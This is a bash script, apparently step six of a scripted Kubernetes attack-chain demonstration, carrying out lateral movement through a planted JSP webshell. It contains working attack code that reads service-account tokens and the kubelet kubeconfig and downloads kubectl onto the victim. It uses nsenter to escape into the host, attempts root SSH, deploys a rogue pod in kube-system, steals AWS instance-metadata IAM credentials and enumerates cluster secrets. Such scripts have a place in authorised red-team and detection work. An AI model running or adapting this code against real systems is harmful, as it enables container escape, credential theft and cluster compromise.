#!/bin/bash
###############################################
# STEP 6: Lateral Movement
###############################################

[ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1

SHELL_FILE="/tmp/.k8s-escape-shell"
if [ -f "$SHELL_FILE" ]; then
    SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
    SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
else
    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
    exit 1
fi

remote_exec() {
    local RAW
    RAW=$(curl -s -o /dev/stdout -w "\n__HTTP_%{http_code}__" --data-urlencode "cmd=$1" "$SHELL_URL")
    local HTTP_CODE
    HTTP_CODE=$(echo "$RAW" | grep -o '__HTTP_[0-9]*__' | grep -o '[0-9]*')
    if [ "$HTTP_CODE" != "200" ] 2>/dev/null; then
        return 1
    fi
    echo "$RAW" | sed 's/__HTTP_[0-9]*__$//' \
        | tr -d '\0' \
        | sed '/^\s*$/d' \
        | grep -v 'java\.io\.InputStream' \
        | grep -v '^//\s*$' \
        | grep -v '^- $'
}

upload_script() {
    local dest="$1"
    shift
    local cmd="echo '#!/bin/bash' > ${dest}"
    for line in "$@"; do
        cmd="${cmd} && echo '${line}' >> ${dest}"
        if [ ${#cmd} -gt 3500 ]; then
            curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
            cmd="true"
        fi
    done
    if [ "$cmd" != "true" ]; then
        curl -s --data-urlencode "cmd=${cmd}" "$SHELL_URL" > /dev/null 2>&1
    fi
    curl -s --data-urlencode "cmd=chmod +x ${dest}" "$SHELL_URL" > /dev/null 2>&1
}

echo ""
echo "================================================"
echo "  STEP 6: Lateral Movement"
echo "================================================"
echo "  MITRE: T1021 / T1550.001 / T1610 / T1530"
echo ""

echo "> Verifying webshell is accessible..."
PRECHECK=$(remote_exec "id")
if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
    echo "  [FAIL] Webshell is not responding"
    exit 1
fi
echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
echo ""

# Resolve API
SA_TOKEN=$(remote_exec "cat /run/secrets/kubernetes.io/serviceaccount/token")
[ -z "$SA_TOKEN" ] && SA_TOKEN=$(remote_exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
KUBECONFIG_RAW=$(remote_exec "cat /host/var/lib/kubelet/kubeconfig")
API_ENDPOINT=$(echo "$KUBECONFIG_RAW" | grep "server:" | head -1 | sed 's/.*server:[[:space:]]*//' | tr -d ' \r')
[ -z "$API_ENDPOINT" ] && API_ENDPOINT="https://$(remote_exec 'printenv KUBERNETES_SERVICE_HOST'):$(remote_exec 'printenv KUBERNETES_SERVICE_PORT')"

echo "> 6.0 - Deploying lateral movement script..."
# Ensure curl + kubectl installed
remote_exec "which curl || (apt-get update -qq && apt-get install -y -qq --allow-unauthenticated curl) 2>/dev/null" > /dev/null 2>&1
remote_exec "which kubectl || (curl -sLO https://dl.k8s.io/release/v1.29.0/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin/) 2>/dev/null" > /dev/null 2>&1

upload_script "/tmp/lateral.sh" \
    "cd /tmp" \
    "TOKEN=\$(cat /run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    "KC=\"kubectl --server=${API_ENDPOINT} --token=\$TOKEN --insecure-skip-tls-verify\"" \
    "echo === 6.1 SSH LATERAL MOVEMENT ===" \
    "echo [*] Attempting SSH connection..." \
    "nsenter --target 1 --mount --uts --ipc --net --pid -- timeout 2 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 root@localhost echo pwned 2>&1 || echo [-] SSH failed" \
    "echo === 6.2 ROGUE WORKLOAD ===" \
    "echo [*] Deploying rogue pod in kube-system..." \
    "\$KC run debug-pod -n kube-system --image=busybox --restart=Never --command -- sleep 10 2>&1 || echo [-] Cannot deploy rogue pod" \
    "sleep 2" \
    "\$KC get pod debug-pod -n kube-system --no-headers 2>/dev/null && echo [!] Rogue pod deployed || echo [-] Rogue pod not running" \
    "\$KC delete pod debug-pod -n kube-system --ignore-not-found 2>/dev/null" \
    "echo === 6.3 AWS IMDS ===" \
    "echo [*] Stealing IMDS credentials via nsenter..." \
    "IMDS_TOKEN=\$(nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -X PUT -H X-aws-ec2-metadata-token-ttl-seconds:21600 http://169.254.169.254/latest/api/token 2>/dev/null)" \
    "ROLE=\$(nsenter --target 1 --mount --uts --ipc --net --pid -- curl -s -H X-aws-ec2-metadata-token:\$IMDS_TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)" \
    "echo [*] IAM Role: \$ROLE" \
    "echo === 6.4 CROSS-NAMESPACE SECRETS ===" \
    "echo [*] Checking secrets across namespaces..." \
    "\$KC get secrets -n default --no-headers 2>/dev/null | wc -l | xargs -I{} echo [*] default: {} secrets" \
    "\$KC get secrets -n kube-system --no-headers 2>/dev/null | wc -l | xargs -I{} echo [!] kube-system: {} secrets" \
    "echo === 6.5 NODE ENUMERATION ===" \
    "echo [*] Enumerating cluster nodes..." \
    "\$KC get nodes -o wide --no-headers 2>/dev/null" \
    "echo === LATERAL MOVEMENT COMPLETE ==="

SCRIPT_CHECK=$(remote_exec "wc -l /tmp/lateral.sh")
echo "  [OK] Script deployed ($SCRIPT_CHECK)"
echo ""

echo "> 6.1 - Executing lateral movement..."
echo ""
LATERAL_RAW=$(remote_exec "bash /tmp/lateral.sh 2>&1")
LATERAL_OUTPUT=$(echo "$LATERAL_RAW" | awk '!seen[$0]++')

echo "$LATERAL_OUTPUT" | while IFS= read -r line; do
    case "$line" in
        *"=== "*"==="*)
            echo ""
            echo "  $line"
            ;;
        *)
            [ -n "$line" ] && echo "    $line"
            ;;
    esac
done

echo ""
echo "================================================"
echo "  STEP 6: Lateral Movement Complete"
echo "================================================"
echo ""
